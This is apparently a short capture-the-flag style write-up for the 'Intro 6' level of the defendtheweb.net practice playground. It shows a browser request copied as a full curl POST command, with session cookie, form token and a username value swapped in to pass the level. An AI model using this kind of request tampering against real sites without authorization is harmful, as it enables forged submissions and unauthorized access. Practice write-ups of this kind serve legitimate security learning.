### Intro 6
Upon seeing I checked the list for specific user, but couldn't find it. Well, as guessed mostly it was a GET request, All I had to do was
Go into browser, rerun the query and copy it as curl. 

Next was to simply replace the user with the correct username and invoke it.
```
curl 'https://defendtheweb.net/playground/intro6' \
  -H 'authority: defendtheweb.net' \
  -H 'pragma: no-cache' \
  -H 'cache-control: no-cache' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'origin: https://defendtheweb.net' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'dnt: 1' \
  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryhWjPAwhUKtPFNyVk' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-fetch-dest: document' \
  -H 'referer: https://defendtheweb.net/playground/intro6' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: PHPSESSID=uj5qih2hrn2j5m96ujiqg46jpf; cookies_dismissed=1' \
  --data-raw $'------WebKitFormBoundaryhWjPAwhUKtPFNyVk\r\nContent-Disposition: form-data; name="token"\r\n\r\n80f9df69ce3970257cef17cddb6bfc80e857a54c6017a073b6700dcaddc5aac4\r\n------WebKitFormBoundaryhWjPAwhUKtPFNyVk\r\nContent-Disposition: form-data; name="formid"\r\n\r\need6f7ad1da0ca8cfcd1448b741d86c8\r\n------WebKitFormBoundaryhWjPAwhUKtPFNyVk\r\nContent-Disposition: form-data; name="username"\r\n\r\nfried_sushi\r\n------WebKitFormBoundaryhWjPAwhUKtPFNyVk--\r\n' \
  --compressed
```

Running the above query got it all sorted :D
